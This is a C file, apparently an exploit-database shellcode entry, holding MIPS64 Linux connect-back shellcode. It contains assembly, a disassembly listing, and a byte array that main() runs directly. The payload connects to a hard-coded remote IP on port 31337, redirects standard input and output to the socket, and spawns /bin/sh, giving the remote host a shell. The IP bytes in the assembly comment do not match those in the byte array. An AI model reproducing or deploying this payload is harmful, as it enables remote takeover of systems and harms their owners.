/*
 * MIPS64r2/Linux-2.6.21.7 - connect back port 31337
 * Author: nicephil
.text
.global __start
__start:

li      $t8,-3
nor     $a0,$t8,$zero
nor     $a1,$t8,$zero
slti    $a2,$zero,-1
li      $v0,5040 #( sys_socket )
syscall 

sw      $v0,-1($sp)
lw      $a0,-1($sp)
li      $t8,-3 #( sa_family = AF_INET )
nor     $t8,$t8,$zero
sw      $t8,-32($sp) 
lui     $t8,0x7a69 #( sin_port = 0x7a69 )
ori     $t8,$t8,0x7a69
sw      $t8,-28($sp)

lui     $t8,0x0a45 #( sin_addr = 0x0a8c ... 
ori     $t8,$t8,0x2c26 #          ...138a )
sw      $t8,-26($sp)

daddi   $a1,$sp,-30
li      $t8,-17 #( addrlen = 16 )     
nor     $a2,$t8,$zero 
li      $v0,5041 #( sys_connect ) 
syscall 


li      $t8,-3
nor     $a1,$t8,$zero
lw      $a0,-1($sp)

dup2_loop:
li      $v0,5032 #( sys_dup2 )
syscall 
addi    $a1,$a1,-1
li      $t8,-1
bne     $a1,$t8, dup2_loop


slti    $a2,$zero,-1
lui     $t8,0x2f2f
ori     $t8,$t8,0x6269
sw      $t8,-12($sp)
lui     $t8,0x6e2f
ori     $t8,$t8,0x7368
sw      $t8,-8($sp)
sw      $zero,-4($sp)
daddiu   $a0,$sp,-12
slti    $a1,$zero,-1
li      $v0,5057 #( sys_execve )
syscall 
0000000000000000 <__start>:
   0:	2418fffd 	li	t8,-3
   4:	03002027 	nor	a0,t8,zero
   8:	03002827 	nor	a1,t8,zero
   c:	2806ffff 	slti	a2,zero,-1
  10:	240213b0 	li	v0,5040
  14:	0000000c 	syscall
  18:	afa2ffff 	sw	v0,-1(sp)
  1c:	8fa4ffff 	lw	a0,-1(sp)
  20:	2418fffd 	li	t8,-3
  24:	0300c027 	nor	t8,t8,zero
  28:	afb8ffe0 	sw	t8,-32(sp)
  2c:	3c187a69 	lui	t8,0x7a69
  30:	37187a69 	ori	t8,t8,0x7a69
  34:	afb8ffe4 	sw	t8,-28(sp)
  38:	3c180a45 	lui	t8,0xa45
  3c:	37182c26 	ori	t8,t8,0x2c26
  40:	afb8ffe6 	sw	t8,-26(sp)
  44:	63a5ffe2 	daddi	a1,sp,-30
  48:	2418ffef 	li	t8,-17
  4c:	03003027 	nor	a2,t8,zero
  50:	240213b1 	li	v0,5041
  54:	0000000c 	syscall
  58:	2418fffd 	li	t8,-3
  5c:	03002827 	nor	a1,t8,zero
  60:	8fa4ffff 	lw	a0,-1(sp)

0000000000000064 <dup2_loop>:
  64:	240213a8 	li	v0,5032
  68:	0000000c 	syscall
  6c:	20a5ffff 	addi	a1,a1,-1
  70:	2418ffff 	li	t8,-1
  74:	14b8fffb 	bne	a1,t8,64 <dup2_loop>
  78:	00000000 	nop
  7c:	2806ffff 	slti	a2,zero,-1
  80:	3c182f2f 	lui	t8,0x2f2f
  84:	37186269 	ori	t8,t8,0x6269
  88:	afb8fff4 	sw	t8,-12(sp)
  8c:	3c186e2f 	lui	t8,0x6e2f
  90:	37187368 	ori	t8,t8,0x7368
  94:	afb8fff8 	sw	t8,-8(sp)
  98:	afa0fffc 	sw	zero,-4(sp)
  9c:	67a4fff4 	daddiu	a0,sp,-12
  a0:	2805ffff 	slti	a1,zero,-1
  a4:	240213c1 	li	v0,5057
  a8:	0000000c 	syscall

 */

#include <stdio.h>
char sc[] = 
"\x24\x18\xff\xfd"
"\x03\x00\x20\x27"
"\x03\x00\x28\x27"
"\x28\x06\xff\xff"
"\x24\x02\x13\xb0"
"\x00\x00\x00\x0c"
"\xaf\xa2\xff\xff"
"\x8f\xa4\xff\xff"
"\x24\x18\xff\xfd"
"\x03\x00\xc0\x27"
"\xaf\xb8\xff\xe0"
"\x3c\x18\x7a\x69"
"\x37\x18\x7a\x69"
"\xaf\xb8\xff\xe4"
"\x3c\x18\xa9\xfe" /* ip address */
"\x37\x18\xf0\x05"
"\xaf\xb8\xff\xe6"
"\x63\xa5\xff\xe2"
"\x24\x18\xff\xef"
"\x03\x00\x30\x27"
"\x24\x02\x13\xb1"
"\x00\x00\x00\x0c"
"\x24\x18\xff\xfd"
"\x03\x00\x28\x27"
"\x8f\xa4\xff\xff"
"\x24\x02\x13\xa8"
"\x00\x00\x00\x0c"
"\x20\xa5\xff\xff"
"\x24\x18\xff\xff"
"\x14\xb8\xff\xfb"
"\x00\x00\x00\x00"
"\x28\x06\xff\xff"
"\x3c\x18\x2f\x2f"
"\x37\x18\x62\x69"
"\xaf\xb8\xff\xf4"
"\x3c\x18\x6e\x2f"
"\x37\x18\x73\x68"
"\xaf\xb8\xff\xf8"
"\xaf\xa0\xff\xfc"
"\x67\xa4\xff\xf4"
"\x28\x05\xff\xff"
"\x24\x02\x13\xc1"
"\x00\x00\x00\x0c"
;

void main ()
{
    void (*s) (void);
    printf ("size: %d\n", sizeof (sc));
    s = sc;
    s();
}
